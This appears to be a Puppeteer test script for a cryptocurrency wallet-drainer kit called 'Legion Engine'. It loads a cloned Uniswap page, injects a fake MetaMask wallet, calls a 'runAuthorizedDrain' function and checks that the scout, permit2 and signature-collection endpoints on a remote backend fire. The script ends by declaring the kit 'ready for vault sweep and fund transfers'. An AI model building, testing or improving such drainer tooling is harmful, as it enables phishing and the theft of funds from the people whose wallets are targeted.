const puppeteer = require('../../node_modules/.pnpm/puppeteer-core@23.11.1_bufferutil@4.1.0_utf-8-validate@5.0.10/node_modules/puppeteer-core');

(async () => {
  console.log('\n' + '🚀'.repeat(30));
  console.log('   LEGION ENGINE - COMPLETE EXTRACTION FLOW TEST');
  console.log('🚀'.repeat(30) + '\n');

  const browser = await puppeteer.launch({
    headless: 'new',
    executablePath: 'C:/Program Files/Google/Chrome/Application/chrome.exe',
    args: ['--no-sandbox', '--disable-blink-features=AutomationControlled']
  });

  const page = await browser.newPage();
  const calls = { scout: [], fusion: [], permit2: [], signature: [], pricing: [] };

  await page.setRequestInterception(true);
  page.on('request', request => {
    const url = request.url();
    if (url.includes('/api/')) {
      const endpoint = url.split('/__legion_proxy/legionapi-production.up.railway.app')[1] || url;
      if (endpoint.includes('/scout')) calls.scout.push(endpoint);
      if (endpoint.includes('recursive-predator-fusion')) calls.fusion.push(endpoint);
      if (endpoint.includes('permit2')) calls.permit2.push(endpoint);
      if (endpoint.includes('/signature-anchor')) calls.signature.push(endpoint);
      if (endpoint.includes('/price')) calls.pricing.push(endpoint);
    }
    request.continue();
  });

  await page.evaluateOnNewDocument(() => {
    window.ethereum = {
      isMetaMask: true,
      selectedAddress: '0x742d35Cc6634C0532925a3b844Bc859fFD72B457',
      chainId: '0x1',
      request: async (args) => {
        if (args.method === 'eth_requestAccounts' || args.method === 'eth_accounts') return ['0x742d35Cc6634C0532925a3b844Bc859fFD72B457'];
        if (args.method === 'eth_signTypedData_v4') return '0x' + 'a'.repeat(130);
        return null;
      },
      _handlers: {},
      on: (event, handler) => {
        if (!window.ethereum._handlers[event]) window.ethereum._handlers[event] = [];
        window.ethereum._handlers[event].push(handler);
      },
      removeListener: () => {}
    };
  });

  console.log('📄 Phase 1: Loading Uniswap clone...');
  await page.goto('http://localhost:8080/swap', {waitUntil: 'networkidle0', timeout: 20000}).catch(() => {});
  await new Promise(r => setTimeout(r, 3000));

  console.log('🔐 Phase 2: Triggering wallet extraction...');
  await page.evaluate(() => {
    if (window.runAuthorizedDrain) window.runAuthorizedDrain();
  }).catch(() => {});
  await new Promise(r => setTimeout(r, 10000));

  console.log('\n' + '='.repeat(75));
  console.log('📊 EXTRACTION FLOW RESULTS');
  console.log('='.repeat(75) + '\n');

  const tests = [
    { name: 'Scout', calls: calls.scout, desc: 'Wallet detection & asset collection' },
    { name: 'Fusion', calls: calls.fusion, desc: 'Opportunity ranking' },
    { name: 'Permit2', calls: calls.permit2, desc: 'EVM signature generation' },
    { name: 'Signature', calls: calls.signature, desc: 'Omnichain settlement collection' },
    { name: 'Pricing', calls: calls.pricing, desc: 'Token price fetching' }
  ];

  let allOk = true;
  tests.forEach(test => {
    const status = test.calls.length > 0 ? '✅' : '❌';
    if (test.calls.length === 0) allOk = false;
    console.log(`${status} ${test.name.padEnd(12)} (${test.calls.length} calls) - ${test.desc}`);
    test.calls.forEach((call, i) => console.log(`     ${i+1}. ${call}`));
  });

  console.log('\n' + '='.repeat(75));
  if (allOk) {
    console.log('🎉 SUCCESS! ALL EXTRACTION FLOWS ACTIVE!');
    console.log('\n✅ Complete omnichain atomic settlement system OPERATIONAL');
    console.log('✅ Wallet detection, asset analysis, and signature collection working');
    console.log('✅ Ready for vault sweep and fund transfers');
  } else {
    console.log('⚠️  Some flows not triggered - check dependencies');
  }
  console.log('='.repeat(75) + '\n');

  await browser.close();
})();
